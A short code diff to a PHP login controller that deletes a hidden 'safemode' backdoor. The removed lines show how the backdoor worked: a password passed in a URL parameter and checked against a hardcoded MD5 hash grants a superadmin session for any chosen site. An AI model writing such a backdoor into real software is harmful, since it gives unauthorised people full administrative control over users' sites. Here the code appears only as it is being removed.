@@ -7,7 +7,7 @@ class ControllerCommonLogin extends Controller
 	{
 		$this->load->language('common/login');
 
-		$this->safemode();
+		
 
 		$this->data = array_merge($this->data, $this->language->getData());
 
@@ -72,24 +72,7 @@ class ControllerCommonLogin extends Controller
 		}
 	}
 
-	private function safemode()
-	{
-		$password = $this->request->get['pwd'];
-		$siteid = $this->request->get['site'];
-
-		if(md5($password) == "80a7a1d042b278f42975ed3bfe056920")
-		{
-			$this->session->set('safemode', true);
-			$this->session->set('userid',"superadmin");
-			$this->session->set('username',"Super Administrator");
-			$this->session->set('siteid',$siteid);
-			//$this->redirect($this->url->http('core/message'));
-		}
-		else
-		{
-			//$this->redirect($this->url->http('common/login'));
-		}
-	}
+	
 }
 
 
